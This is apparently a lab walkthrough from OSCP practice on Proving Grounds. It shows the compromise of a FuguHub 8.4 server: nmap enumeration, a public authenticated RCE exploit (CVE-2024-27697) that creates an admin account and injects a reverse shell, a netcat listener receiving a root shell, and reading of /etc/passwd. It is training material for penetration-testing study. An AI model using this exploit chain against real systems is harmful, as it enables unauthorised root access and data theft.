参考资料：


复现教程
https://medium.com/@robertip/oscp-practice-hub-proving-ground-practice-b869346ad8f2



http://192.168.226.25:8082/

exp

https://github.com/SanjinDedic/FuguHub-8.4-Authenticated-RCE-CVE-2024-27697?source=post_page-----b869346ad8f2---------------------------------------



Linux Machine

### Service Enumeration

There are 4 ports open in this machine. SSH/22, HTTP/80, 8082/HTTP and 9999/HTTP.

[](https://medium.com/blog/newsletter?source=promotion_paragraph---post_body_banner_beneficial_intelligence_nl--b869346ad8f2---------------------------------------)

From the nmap result, the HTTP site on port 8082 and port 9999 seems like the same site with and without SSL. This looks interesting to me.

$ nmap -sT -p- --min-rate 5000 192.168.245.25  
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-09 20:03 EDT  
Nmap scan report for 192.168.245.25  
Host is up (0.014s latency).  
Not shown: 65531 closed tcp ports (conn-refused)  
PORT     STATE SERVICE  
22/tcp   open  ssh  
80/tcp   open  http  
8082/tcp open  blackice-alerts  
9999/tcp open  abyss  
  
Nmap done: 1 IP address (1 host up) scanned in 7.21 seconds  
                                                                                                                     
$ nmap -sC -sV -A 192.168.245.25 -p22,80,8082,9999  
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-09 20:04 EDT  
Nmap scan report for 192.168.245.25  
Host is up (0.013s latency).  
  
PORT     STATE SERVICE  VERSION  
22/tcp   open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)  
| ssh-hostkey:   
|   3072 c9:c3:da:15:28:3b:f1:f8:9a:36:df:4d:36:6b:a7:44 (RSA)  
|   256 26:03:2b:f6:da:90:1d:1b:ec:8d:8f:8d:1e:7e:3d:6b (ECDSA)  
|_  256 fb:43:b2:b0:19:2f:d3:f6:bc:aa:60:67:ab:c1:af:37 (ED25519)  
80/tcp   open  http     nginx 1.18.0  
|_http-title: 403 Forbidden  
|_http-server-header: nginx/1.18.0  
8082/tcp open  http     Barracuda Embedded Web Server  
|_http-server-header: BarracudaServer.com (Posix)  
| http-webdav-scan:   
|   Server Date: Wed, 10 Apr 2024 00:04:19 GMT  
|   Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, PATCH, POST, PUT, COPY, DELETE, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK  
|   Server Type: BarracudaServer.com (Posix)  
|_  WebDAV type: Unknown  
| http-methods:   
|_  Potentially risky methods: PROPFIND PATCH PUT COPY DELETE MOVE MKCOL PROPPATCH LOCK UNLOCK  
|_http-title: Home  
9999/tcp open  ssl/http Barracuda Embedded Web Server  
| http-methods:   
|_  Potentially risky methods: PROPFIND PATCH PUT COPY DELETE MOVE MKCOL PROPPATCH LOCK UNLOCK  
|_http-title: Home  
| http-webdav-scan:   
|   Server Date: Wed, 10 Apr 2024 00:04:20 GMT  
|   Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, PATCH, POST, PUT, COPY, DELETE, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK  
|   Server Type: BarracudaServer.com (Posix)  
|_  WebDAV type: Unknown  
| ssl-cert: Subject: commonName=FuguHub/stateOrProvinceName=California/countryName=US  
| Subject Alternative Name: DNS:FuguHub, DNS:FuguHub.local, DNS:localhost  
| Not valid before: 2019-07-16T19:15:09  
|_Not valid after:  2074-04-18T19:15:09  
|_http-server-header: BarracudaServer.com (Posix)  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  
  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 19.80 seconds

### HTTP/8082

Open the port 8082 website in the browser, in the landing page we could find that the webserver is a FuguHub and the version could be found in the page

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*Lcu8WWoiRNixMeHGw87sWg.png)

Googling the exploit for FuguHub CMS, there is a authenticated RCE vulnerability for the version FuguHub 8.4 (CVE-2024–27697).

[

## GitHub - SanjinDedic/FuguHub-8.4-Authenticated-RCE-CVE-2024-27697: Arbitrary Code Execution on…

### Arbitrary Code Execution on FuguHub 8.4. Contribute to SanjinDedic/FuguHub-8.4-Authenticated-RCE-CVE-2024-27697…

github.com



](https://github.com/SanjinDedic/FuguHub-8.4-Authenticated-RCE-CVE-2024-27697?source=post_page-----b869346ad8f2---------------------------------------)

As the page do not require any authentication, I assume we could run the exploit directly.

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*5fNSjOYMu71lOcuZEigdAA.png)

The exploit is running well and setup a netcat session for the reverse shell. The reverse shell is running as root user.

$ python exploit.py -r 192.168.245.25 -rp 8082 -l 192.168.45.205 -p 8082  
[*] Checking for admin user...  
[+] No admin user exists yet, creating account with admin:password  
[+] User created!  
[+] Logging in...  
[+] Success! Injecting the reverse shell...  
[+] Successfully injected the reverse shell into the About page.  
[+] Triggering the reverse shell, check your listener...  
  
  
$ sudo nc -nlvp 8082  
listening on [any] 8082 ...  
connect to [192.168.45.205] from (UNKNOWN) [192.168.245.25] 47410  
id  
uid=0(root) gid=0(root) groups=0(root)  
pwd  
/var/www/html  
cd /root  
pwd   
/var/www/html  
ls -l  
total 3600  
drwxr-xr-x 2 offsec offsec    4096 Nov  9  2015 applications  
-rw-r--r-- 1 root   root       179 Jun 13  2023 bd.dat  
-rw-r--r-- 1 offsec offsec      56 Jun 13  2023 bdd.conf  
drwxr-x--- 3 root   root      4096 Jun 13  2023 cache  
drwxr-xr-x 5 offsec offsec    4096 Jun 13  2023 cmsdocs  
drwxr-xr-x 2 offsec offsec    4096 Apr  9 20:20 data  
-rw-r--r-- 1 root   root       164 Apr  9 20:20 dbcfg.dat  
drwxr-xr-x 2 offsec offsec    4096 Apr 30  2014 disk  
-rw-r--r-- 1 root   root       135 Apr  9 20:20 drvcnstr.dat  
-rw-r--r-- 1 root   root        33 Apr  9 20:20 emails.dat  
-rwxr-xr-x 1 offsec offsec 2399312 Nov  3  2021 FuguHub  
-rwxr-xr-x 1 offsec offsec     220 Nov  3  2021 FuguHub.lua  
-rw-r--r-- 1 root   root   1188104 Jun 13  2023 FuguHub.zip  
drwxr-xr-x 2 offsec offsec    4096 Sep 28  2016 InstallDaemon  
-rw-r--r-- 1 offsec offsec      87 Nov  3  2021 LICENSE.txt  
-rwxr-xr-x 1 offsec offsec   18730 Nov  3  2021 readme.txt  
-rw-r--r-- 1 root   root       794 Apr  9 20:20 roles.dat  
drwxr-xr-x 2 offsec offsec    4096 Apr 30  2014 themes  
drwxr-x--- 2 root   root      4096 Aug 14  2023 trace  
-rw-r--r-- 1 root   root        78 Apr  9 20:20 tuncnstr.dat  
-rw-r--r-- 1 root   root       462 Apr  9 20:20 user.dat  
cat /etc/passwd  
root:x:0:0:root:/root:/bin/bash  
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin  
bin:x:2:2:bin:/bin:/usr/sbin/nologin  
sys:x:3:3:sys:/dev:/usr/sbin/nologin  
sync:x:4:65534:sync:/bin:/bin/sync  
games:x:5:60:games:/usr/games:/usr/sbin/nologin  
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin  
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin  
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin  
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin  
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin  
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin  
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin  
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin  
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin  
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin  
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin  
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin  
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin  
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin  
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin  
messagebus:x:103:109::/nonexistent:/usr/sbin/nologin  
systemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin  
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin  
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin  
offsec:x:1000:1000:,,,:/home/offsec:/bin/bash  
ls -l /root  
total 8  
-rw-r--r-- 1 root root 21 Jun 14  2023 email4.txt  
-rw-r--r-- 1 root root 33 Apr  9 20:19 proof.txt
